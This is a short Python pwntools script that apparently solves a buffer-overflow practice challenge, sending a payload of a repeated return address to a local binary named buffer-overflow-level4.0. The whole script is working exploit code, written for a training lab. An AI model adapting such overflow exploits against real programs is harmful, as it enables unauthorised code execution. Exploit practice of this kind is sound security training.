from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

payload =   32 * p64(0x004012C0)

print(payload)

io = process('/challenge/buffer-overflow-level4.0')

io.sendlineafter("Give me your input\n", payload)

while True:
    io.recvline()
